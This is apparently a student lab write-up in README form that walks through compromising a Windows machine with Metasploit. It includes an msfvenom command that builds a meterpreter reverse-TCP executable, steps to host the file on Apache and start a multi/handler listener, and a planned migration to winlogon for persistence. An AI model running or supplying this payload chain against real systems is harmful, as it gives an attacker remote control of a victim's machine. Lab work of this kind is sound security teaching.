# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
<img width="705" height="297" alt="image" src="https://github.com/user-attachments/assets/a2f83cf3-52ca-4bad-be5c-1d4c674d33fd" />

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="837" height="121" alt="image" src="https://github.com/user-attachments/assets/982c474e-4131-4b47-b9d6-d534d2e782a7" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="343" height="59" alt="image" src="https://github.com/user-attachments/assets/11ad46d6-3b25-47ac-8c88-3dcbcb965039" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="294" height="45" alt="image" src="https://github.com/user-attachments/assets/41400286-c88b-4cba-84d5-9300ab84d8dc" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="574" height="115" alt="Screenshot 2026-02-14 133254" src="https://github.com/user-attachments/assets/c707b6e4-35e7-4f30-8777-dc6469374aed" />

Check the status of apache2
## OUTPUT:

<img width="730" height="528" alt="image" src="https://github.com/user-attachments/assets/0b939248-61ba-4cc7-93a0-64be54078801" />


Invoke msfconsole:

## OUTPUT:
<img width="505" height="69" alt="image" src="https://github.com/user-attachments/assets/1b3f88b1-ed47-498c-85a2-93be459d94c3" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:


<img width="665" height="193" alt="image" src="https://github.com/user-attachments/assets/ad43268f-1dd6-4027-943a-5c3fd4a16de4" />


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://172.20.10.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 

## OUTPUT:

<img width="606" height="160" alt="image" src="https://github.com/user-attachments/assets/8b482ce3-df15-4e5b-82a4-e425af991949" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 115


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
